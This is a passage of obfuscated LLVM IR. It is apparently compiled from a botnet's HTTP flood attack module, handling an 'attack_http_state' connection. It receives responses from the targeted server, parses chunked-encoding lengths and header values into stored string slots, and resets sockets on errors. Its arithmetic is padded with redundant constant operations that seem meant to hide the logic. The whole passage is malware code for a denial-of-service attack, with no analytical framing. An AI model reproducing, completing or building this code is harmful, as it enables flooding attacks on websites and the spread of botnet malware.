  %2339 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2338, i32 0, i32 17
  %2340 = load i32, i32* %2339, align 4
  %2341 = add i32 %2340, 717391611
  %2342 = sub i32 %2341, 64
  %2343 = sub i32 %2342, 717391611
  %2344 = sub nsw i32 %2340, 64
  store i32 %2343, i32* %2339, align 4
  br label %2345

; <label>:2345:                                   ; preds = %2330, %2325
  %2346 = call i32* @__errno_location() #7
  store i32 0, i32* %2346, align 4
  %2347 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2348 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2347, i32 0, i32 0
  %2349 = load i32, i32* %2348, align 4
  %2350 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2351 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2350, i32 0, i32 18
  %2352 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2351, i32 0, i32 0
  %2353 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2354 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2353, i32 0, i32 17
  %2355 = load i32, i32* %2354, align 4
  %2356 = sext i32 %2355 to i64
  %2357 = getelementptr inbounds i8, i8* %2352, i64 %2356
  %2358 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2359 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2358, i32 0, i32 17
  %2360 = load i32, i32* %2359, align 4
  %2361 = sub i32 1024, 1171012843
  %2362 = sub i32 %2361, %2360
  %2363 = add i32 %2362, 1171012843
  %2364 = sub nsw i32 1024, %2360
  %2365 = sext i32 %2363 to i64
  %2366 = call i64 @recv(i32 %2349, i8* %2357, i64 %2365, i32 16384)
  %2367 = trunc i64 %2366 to i32
  store i32 %2367, i32* %12, align 4
  %2368 = load i32, i32* %12, align 4
  %2369 = icmp eq i32 %2368, 0
  br i1 %2369, label %2370, label %2372

; <label>:2370:                                   ; preds = %2345
  %2371 = call i32* @__errno_location() #7
  store i32 104, i32* %2371, align 4
  store i32 -1, i32* %12, align 4
  br label %2372

; <label>:2372:                                   ; preds = %2370, %2345
  %2373 = load i32, i32* %12, align 4
  %2374 = icmp eq i32 %2373, -1
  br i1 %2374, label %2375, label %2393

; <label>:2375:                                   ; preds = %2372
  %2376 = call i32* @__errno_location() #7
  %2377 = load i32, i32* %2376, align 4
  %2378 = icmp ne i32 %2377, 11
  br i1 %2378, label %2379, label %2392

; <label>:2379:                                   ; preds = %2375
  %2380 = call i32* @__errno_location() #7
  %2381 = load i32, i32* %2380, align 4
  %2382 = icmp ne i32 %2381, 11
  br i1 %2382, label %2383, label %2392

; <label>:2383:                                   ; preds = %2379
  %2384 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2385 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2384, i32 0, i32 0
  %2386 = load i32, i32* %2385, align 4
  %2387 = call i32 @close(i32 %2386)
  %2388 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2389 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2388, i32 0, i32 0
  store i32 -1, i32* %2389, align 4
  %2390 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2391 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2390, i32 0, i32 1
  store i8 0, i8* %2391, align 4
  br label %2392

; <label>:2392:                                   ; preds = %2383, %2379, %2375
  br label %2741

; <label>:2393:                                   ; preds = %2372
  %2394 = load i32, i32* %12, align 4
  %2395 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2396 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2395, i32 0, i32 17
  %2397 = load i32, i32* %2396, align 4
  %2398 = sub i32 %2397, 625069948
  %2399 = add i32 %2398, %2394
  %2400 = add i32 %2399, 625069948
  %2401 = add nsw i32 %2397, %2394
  store i32 %2400, i32* %2396, align 4
  %2402 = load i32, i32* %27, align 4
  %2403 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2404 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2403, i32 0, i32 2
  store i32 %2402, i32* %2404, align 4
  br label %2405

; <label>:2405:                                   ; preds = %2739, %2393
  store i32 0, i32* %59, align 4
  %2406 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2407 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2406, i32 0, i32 14
  %2408 = load i32, i32* %2407, align 4
  %2409 = icmp sgt i32 %2408, 0
  br i1 %2409, label %2410, label %2609

; <label>:2410:                                   ; preds = %2405
  %2411 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2412 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2411, i32 0, i32 14
  %2413 = load i32, i32* %2412, align 4
  %2414 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2415 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2414, i32 0, i32 17
  %2416 = load i32, i32* %2415, align 4
  %2417 = icmp sgt i32 %2413, %2416
  br i1 %2417, label %2418, label %2422

; <label>:2418:                                   ; preds = %2410
  %2419 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2420 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2419, i32 0, i32 17
  %2421 = load i32, i32* %2420, align 4
  br label %2426

; <label>:2422:                                   ; preds = %2410
  %2423 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2424 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2423, i32 0, i32 14
  %2425 = load i32, i32* %2424, align 4
  br label %2426

; <label>:2426:                                   ; preds = %2422, %2418
  %2427 = phi i32 [ %2421, %2418 ], [ %2425, %2422 ]
  store i32 %2427, i32* %59, align 4
  %2428 = load i32, i32* %59, align 4
  %2429 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2430 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2429, i32 0, i32 14
  %2431 = load i32, i32* %2430, align 4
  %2432 = sub i32 0, %2428
  %2433 = add i32 %2431, %2432
  %2434 = sub nsw i32 %2431, %2428
  store i32 %2433, i32* %2430, align 4
  %2435 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2436 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2435, i32 0, i32 11
  %2437 = load i32, i32* %2436, align 4
  %2438 = icmp eq i32 %2437, 1
  br i1 %2438, label %2439, label %2608

; <label>:2439:                                   ; preds = %2426
  %2440 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2441 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2440, i32 0, i32 18
  %2442 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2441, i32 0, i32 0
  %2443 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2444 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2443, i32 0, i32 17
  %2445 = load i32, i32* %2444, align 4
  %2446 = call i8* @table_retrieve_val(i32 52, i32* null)
  %2447 = call i32 @util_memsearch(i8* %2442, i32 %2445, i8* %2446, i32 11)
  %2448 = icmp ne i32 %2447, -1
  br i1 %2448, label %2449, label %2607

; <label>:2449:                                   ; preds = %2439
  %2450 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2451 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2450, i32 0, i32 18
  %2452 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2451, i32 0, i32 0
  %2453 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2454 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2453, i32 0, i32 17
  %2455 = load i32, i32* %2454, align 4
  %2456 = call i8* @table_retrieve_val(i32 52, i32* null)
  %2457 = call i32 @util_memsearch(i8* %2452, i32 %2455, i8* %2456, i32 11)
  store i32 %2457, i32* %60, align 4
  %2458 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2459 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2458, i32 0, i32 18
  %2460 = load i32, i32* %60, align 4
  %2461 = sext i32 %2460 to i64
  %2462 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2459, i64 0, i64 %2461
  %2463 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2464 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2463, i32 0, i32 17
  %2465 = load i32, i32* %2464, align 4
  %2466 = load i32, i32* %60, align 4
  %2467 = sub i32 %2465, -464170612
  %2468 = sub i32 %2467, %2466
  %2469 = add i32 %2468, -464170612
  %2470 = sub nsw i32 %2465, %2466
  %2471 = call i32 @util_memsearch(i8* %2462, i32 %2469, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0), i32 1)
  store i32 %2471, i32* %61, align 4
  %2472 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2473 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2472, i32 0, i32 18
  %2474 = load i32, i32* %60, align 4
  %2475 = load i32, i32* %61, align 4
  %2476 = sub i32 %2475, -1670736767
  %2477 = sub i32 %2476, 1
  %2478 = add i32 %2477, -1670736767
  %2479 = sub nsw i32 %2475, 1
  %2480 = sub i32 0, %2478
  %2481 = sub i32 %2474, %2480
  %2482 = add nsw i32 %2474, %2478
  %2483 = sext i32 %2481 to i64
  %2484 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2473, i64 0, i64 %2483
  store i8 0, i8* %2484, align 1
  %2485 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2486 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2485, i32 0, i32 15
  %2487 = load i32, i32* %2486, align 4
  %2488 = icmp slt i32 %2487, 5
  br i1 %2488, label %2489, label %2602

; <label>:2489:                                   ; preds = %2449
  %2490 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2491 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2490, i32 0, i32 18
  %2492 = load i32, i32* %60, align 4
  %2493 = sext i32 %2492 to i64
  %2494 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2491, i64 0, i64 %2493
  %2495 = call i32 @util_strlen(i8* %2494)
  %2496 = icmp slt i32 %2495, 128
  br i1 %2496, label %2497, label %2602

; <label>:2497:                                   ; preds = %2489
  %2498 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2499 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2498, i32 0, i32 16
  %2500 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2501 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2500, i32 0, i32 15
  %2502 = load i32, i32* %2501, align 4
  %2503 = sext i32 %2502 to i64
  %2504 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2499, i64 0, i64 %2503
  %2505 = getelementptr inbounds [128 x i8], [128 x i8]* %2504, i32 0, i32 0
  %2506 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2507 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2506, i32 0, i32 18
  %2508 = load i32, i32* %60, align 4
  %2509 = sext i32 %2508 to i64
  %2510 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2507, i64 0, i64 %2509
  %2511 = call i32 @util_strcpy(i8* %2505, i8* %2510)
  %2512 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2513 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2512, i32 0, i32 16
  %2514 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2515 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2514, i32 0, i32 15
  %2516 = load i32, i32* %2515, align 4
  %2517 = sext i32 %2516 to i64
  %2518 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2513, i64 0, i64 %2517
  %2519 = getelementptr inbounds [128 x i8], [128 x i8]* %2518, i32 0, i32 0
  %2520 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2521 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2520, i32 0, i32 16
  %2522 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2523 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2522, i32 0, i32 15
  %2524 = load i32, i32* %2523, align 4
  %2525 = sext i32 %2524 to i64
  %2526 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2521, i64 0, i64 %2525
  %2527 = getelementptr inbounds [128 x i8], [128 x i8]* %2526, i32 0, i32 0
  %2528 = call i32 @util_strlen(i8* %2527)
  %2529 = sext i32 %2528 to i64
  %2530 = getelementptr inbounds i8, i8* %2519, i64 %2529
  %2531 = call i32 @util_strcpy(i8* %2530, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i32 0, i32 0))
  %2532 = load i32, i32* %61, align 4
  %2533 = add i32 %2532, -2011821954
  %2534 = add i32 %2533, 3
  %2535 = sub i32 %2534, -2011821954
  %2536 = add nsw i32 %2532, 3
  %2537 = load i32, i32* %60, align 4
  %2538 = sub i32 %2537, 1534009971
  %2539 = add i32 %2538, %2535
  %2540 = add i32 %2539, 1534009971
  %2541 = add nsw i32 %2537, %2535
  store i32 %2540, i32* %60, align 4
  %2542 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2543 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2542, i32 0, i32 18
  %2544 = load i32, i32* %60, align 4
  %2545 = sext i32 %2544 to i64
  %2546 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2543, i64 0, i64 %2545
  %2547 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2548 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2547, i32 0, i32 17
  %2549 = load i32, i32* %2548, align 4
  %2550 = load i32, i32* %60, align 4
  %2551 = add i32 %2549, -1741439335
  %2552 = sub i32 %2551, %2550
  %2553 = sub i32 %2552, -1741439335
  %2554 = sub nsw i32 %2549, %2550
  %2555 = call i32 @util_memsearch(i8* %2546, i32 %2553, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0), i32 1)
  store i32 %2555, i32* %61, align 4
  %2556 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2557 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2556, i32 0, i32 18
  %2558 = load i32, i32* %60, align 4
  %2559 = load i32, i32* %61, align 4
  %2560 = add i32 %2559, 1181490469
  %2561 = sub i32 %2560, 1
  %2562 = sub i32 %2561, 1181490469
  %2563 = sub nsw i32 %2559, 1
  %2564 = add i32 %2558, 85267067
  %2565 = add i32 %2564, %2562
  %2566 = sub i32 %2565, 85267067
  %2567 = add nsw i32 %2558, %2562
  %2568 = sext i32 %2566 to i64
  %2569 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2557, i64 0, i64 %2568
  store i8 0, i8* %2569, align 1
  %2570 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2571 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2570, i32 0, i32 16
  %2572 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2573 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2572, i32 0, i32 15
  %2574 = load i32, i32* %2573, align 4
  %2575 = sext i32 %2574 to i64
  %2576 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2571, i64 0, i64 %2575
  %2577 = getelementptr inbounds [128 x i8], [128 x i8]* %2576, i32 0, i32 0
  %2578 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2579 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2578, i32 0, i32 16
  %2580 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2581 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2580, i32 0, i32 15
  %2582 = load i32, i32* %2581, align 4
  %2583 = sext i32 %2582 to i64
  %2584 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2579, i64 0, i64 %2583
  %2585 = getelementptr inbounds [128 x i8], [128 x i8]* %2584, i32 0, i32 0
  %2586 = call i32 @util_strlen(i8* %2585)
  %2587 = sext i32 %2586 to i64
  %2588 = getelementptr inbounds i8, i8* %2577, i64 %2587
  %2589 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2590 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2589, i32 0, i32 18
  %2591 = load i32, i32* %60, align 4
  %2592 = sext i32 %2591 to i64
  %2593 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2590, i64 0, i64 %2592
  %2594 = call i32 @util_strcpy(i8* %2588, i8* %2593)
  %2595 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2596 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2595, i32 0, i32 15
  %2597 = load i32, i32* %2596, align 4
  %2598 = add i32 %2597, -715069687
  %2599 = add i32 %2598, 1
  %2600 = sub i32 %2599, -715069687
  %2601 = add nsw i32 %2597, 1
  store i32 %2600, i32* %2596, align 4
  br label %2602

; <label>:2602:                                   ; preds = %2497, %2489, %2449
  %2603 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2604 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2603, i32 0, i32 14
  store i32 -1, i32* %2604, align 4
  %2605 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2606 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2605, i32 0, i32 1
  store i8 10, i8* %2606, align 4
  br label %2740

; <label>:2607:                                   ; preds = %2439
  br label %2608

; <label>:2608:                                   ; preds = %2607, %2426
  br label %2609

; <label>:2609:                                   ; preds = %2608, %2405
  %2610 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2611 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2610, i32 0, i32 14
  %2612 = load i32, i32* %2611, align 4
  %2613 = icmp eq i32 %2612, 0
  br i1 %2613, label %2614, label %2700

; <label>:2614:                                   ; preds = %2609
  %2615 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2616 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2615, i32 0, i32 13
  %2617 = load i32, i32* %2616, align 4
  %2618 = icmp eq i32 %2617, 1
  br i1 %2618, label %2619, label %2680

; <label>:2619:                                   ; preds = %2614
  %2620 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2621 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2620, i32 0, i32 18
  %2622 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2621, i32 0, i32 0
  %2623 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2624 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2623, i32 0, i32 17
  %2625 = load i32, i32* %2624, align 4
  %2626 = call i32 @util_memsearch(i8* %2622, i32 %2625, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  %2627 = icmp ne i32 %2626, -1
  br i1 %2627, label %2628, label %2679

; <label>:2628:                                   ; preds = %2619
  %2629 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2630 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2629, i32 0, i32 18
  %2631 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2630, i32 0, i32 0
  %2632 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2633 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2632, i32 0, i32 17
  %2634 = load i32, i32* %2633, align 4
  %2635 = call i32 @util_memsearch(i8* %2631, i32 %2634, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %2635, i32* %62, align 4
  %2636 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2637 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2636, i32 0, i32 18
  %2638 = load i32, i32* %62, align 4
  %2639 = add i32 %2638, 893388400
  %2640 = sub i32 %2639, 2
  %2641 = sub i32 %2640, 893388400
  %2642 = sub nsw i32 %2638, 2
  %2643 = sext i32 %2641 to i64
  %2644 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2637, i64 0, i64 %2643
  store i8 0, i8* %2644, align 1
  %2645 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2646 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2645, i32 0, i32 18
  %2647 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2646, i32 0, i32 0
  %2648 = load i32, i32* %62, align 4
  %2649 = call i32 @util_memsearch(i8* %2647, i32 %2648, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %2650 = icmp ne i32 %2649, -1
  br i1 %2650, label %2651, label %2661

; <label>:2651:                                   ; preds = %2628
  %2652 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2653 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2652, i32 0, i32 18
  %2654 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2655 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2654, i32 0, i32 18
  %2656 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2655, i32 0, i32 0
  %2657 = load i32, i32* %62, align 4
  %2658 = call i32 @util_memsearch(i8* %2656, i32 %2657, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %2659 = sext i32 %2658 to i64
  %2660 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2653, i64 0, i64 %2659
  store i8 0, i8* %2660, align 1
  br label %2661

; <label>:2661:                                   ; preds = %2651, %2628
  %2662 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2663 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2662, i32 0, i32 18
  %2664 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2663, i32 0, i32 0
  %2665 = call i32 @util_atoi(i8* %2664, i32 16)
  store i32 %2665, i32* %63, align 4
  %2666 = load i32, i32* %63, align 4
  %2667 = icmp eq i32 %2666, 0
  br i1 %2667, label %2668, label %2671

; <label>:2668:                                   ; preds = %2661
  %2669 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2670 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2669, i32 0, i32 1
  store i8 1, i8* %2670, align 4
  br label %2740

; <label>:2671:                                   ; preds = %2661
  %2672 = load i32, i32* %63, align 4
  %2673 = sub i32 0, 2
  %2674 = sub i32 %2672, %2673
  %2675 = add nsw i32 %2672, 2
  %2676 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2677 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2676, i32 0, i32 14
  store i32 %2674, i32* %2677, align 4
  %2678 = load i32, i32* %62, align 4
  store i32 %2678, i32* %59, align 4
  br label %2679

; <label>:2679:                                   ; preds = %2671, %2619
  br label %2699

; <label>:2680:                                   ; preds = %2614
  %2681 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2682 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2681, i32 0, i32 17
  %2683 = load i32, i32* %2682, align 4
  %2684 = load i32, i32* %59, align 4
  %2685 = sub i32 %2683, 1613326456
  %2686 = sub i32 %2685, %2684
  %2687 = add i32 %2686, 1613326456
  %2688 = sub nsw i32 %2683, %2684
  %2689 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2690 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2689, i32 0, i32 14
  store i32 %2687, i32* %2690, align 4
  %2691 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2692 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2691, i32 0, i32 14
  %2693 = load i32, i32* %2692, align 4
  %2694 = icmp eq i32 %2693, 0
  br i1 %2694, label %2695, label %2698

; <label>:2695:                                   ; preds = %2680
  %2696 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2697 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2696, i32 0, i32 1
  store i8 1, i8* %2697, align 4
  br label %2740

; <label>:2698:                                   ; preds = %2680
  br label %2699

; <label>:2699:                                   ; preds = %2698, %2679
  br label %2700

; <label>:2700:                                   ; preds = %2699, %2609
  %2701 = load i32, i32* %59, align 4
  %2702 = icmp eq i32 %2701, 0
  br i1 %2702, label %2703, label %2704

; <label>:2703:                                   ; preds = %2700
  br label %2740

; <label>:2704:                                   ; preds = %2700
  %2705 = load i32, i32* %59, align 4
  %2706 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2707 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2706, i32 0, i32 17
  %2708 = load i32, i32* %2707, align 4
  %2709 = sub i32 %2708, -2002336800
  %2710 = sub i32 %2709, %2705
  %2711 = add i32 %2710, -2002336800
  %2712 = sub nsw i32 %2708, %2705
  store i32 %2711, i32* %2707, align 4
  %2713 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2714 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2713, i32 0, i32 18
  %2715 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2714, i32 0, i32 0
  %2716 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2717 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2716, i32 0, i32 18
  %2718 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2717, i32 0, i32 0
  %2719 = load i32, i32* %59, align 4
  %2720 = sext i32 %2719 to i64
  %2721 = getelementptr inbounds i8, i8* %2718, i64 %2720
  %2722 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2723 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2722, i32 0, i32 17
  %2724 = load i32, i32* %2723, align 4
  %2725 = sext i32 %2724 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %2715, i8* %2721, i64 %2725, i32 1, i1 false)
  %2726 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2727 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2726, i32 0, i32 18
  %2728 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2729 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2728, i32 0, i32 17
  %2730 = load i32, i32* %2729, align 4
  %2731 = sext i32 %2730 to i64
  %2732 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2727, i64 0, i64 %2731
  store i8 0, i8* %2732, align 1
  %2733 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2734 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2733, i32 0, i32 17
  %2735 = load i32, i32* %2734, align 4
  %2736 = icmp eq i32 %2735, 0
  br i1 %2736, label %2737, label %2738

; <label>:2737:                                   ; preds = %2704
  br label %2740

; <label>:2738:                                   ; preds = %2704
  br label %2739

; <label>:2739:                                   ; preds = %2738
  br label %2405

; <label>:2740:                                   ; preds = %2737, %2703, %2695, %2668, %2602
  br label %2318

; <label>:2741:                                   ; preds = %2392, %2324
  br label %2794

; <label>:2742:                                   ; preds = %2311
  %2743 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2744 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2743, i32 0, i32 1
  %2745 = load i8, i8* %2744, align 4
  %2746 = zext i8 %2745 to i32
  %2747 = icmp eq i32 %2746, 10
  br i1 %2747, label %2748, label %2793

; <label>:2748:                                   ; preds = %2742
  br label %2749

; <label>:2749:                                   ; preds = %2782, %2748
  %2750 = call i32* @__errno_location() #7
  store i32 0, i32* %2750, align 4
  %2751 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2752 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2751, i32 0, i32 0
  %2753 = load i32, i32* %2752, align 4
  %2754 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2755 = call i64 @recv(i32 %2753, i8* %2754, i64 10240, i32 16384)
  %2756 = trunc i64 %2755 to i32
  store i32 %2756, i32* %12, align 4
  %2757 = load i32, i32* %12, align 4
  %2758 = icmp eq i32 %2757, 0
  br i1 %2758, label %2759, label %2761

; <label>:2759:                                   ; preds = %2749
  %2760 = call i32* @__errno_location() #7
  store i32 104, i32* %2760, align 4
  store i32 -1, i32* %12, align 4
  br label %2761

; <label>:2761:                                   ; preds = %2759, %2749
  %2762 = load i32, i32* %12, align 4
  %2763 = icmp eq i32 %2762, -1
  br i1 %2763, label %2764, label %2782

; <label>:2764:                                   ; preds = %2761
  %2765 = call i32* @__errno_location() #7
  %2766 = load i32, i32* %2765, align 4
  %2767 = icmp ne i32 %2766, 11
  br i1 %2767, label %2768, label %2781

; <label>:2768:                                   ; preds = %2764
  %2769 = call i32* @__errno_location() #7
  %2770 = load i32, i32* %2769, align 4
  %2771 = icmp ne i32 %2770, 11
  br i1 %2771, label %2772, label %2781

